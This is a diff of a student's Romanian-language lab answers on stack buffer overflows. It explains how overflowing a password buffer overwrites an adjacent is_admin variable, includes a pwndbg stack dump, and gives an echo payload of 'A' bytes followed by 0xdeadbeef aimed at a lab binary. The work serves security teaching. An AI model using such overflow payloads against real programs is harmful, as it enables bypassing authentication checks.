@@ -1,5 +1,15 @@
 Q1: Putem folosi buffer overflow pentru a accesa alte zone de memorie si putem modifica alte variabile
-Q2: Deoarece in stack variabilele is_admin si password sunt una langa alta pe stiva, doar daca facem buffer overflow cu un octet in plus is_admin primeste alta valoare deci punem orice sir de caractere mai mare de 8 
+Q2: Deoarece in stack variabilele is_admin si password sunt una langa alta pe stiva, doar daca facem buffer 
+overflow cu un octet in plus is_admin primeste alta valoare deci punem orice sir de caractere mai mare de 8 
+Q3: Dupa ce am populat buffer ul cu 9 caractere 
+pwndbg> x/10gx $rsp
+0x7fffffffd880: 0x6461646164616461      0x0000000000000061
+0x7fffffffd890: 0x0000000000000001      0x00007ffff7dd5ca8
+0x7fffffffd8a0: 0x00007fffffffd990      0x0000000000401146
+0x7fffffffd8b0: 0x0000000100400040      0x00007fffffffd9a8
+0x7fffffffd8c0: 0x00007fffffffd9a8      0xf0efe9662f5e2f73
+Se observa ca aparare dupa 8 octeti normal mai exista inca un octet in celalalt qword 
+
 Q4:
 Pentru ex 2 variabila is_admin este long adica pe 8 octeti deci payloadul va fi 8 de A pentru parola si \xef\xbe\xad\xde\x00\x00\x00\x00 pentru is_admin
  echo '\x41\x41\x41\x41\x41\x41\x41\x41\xef\xbe\xad\xde\x00\x00\x00\x00' | ./bin/ex2 
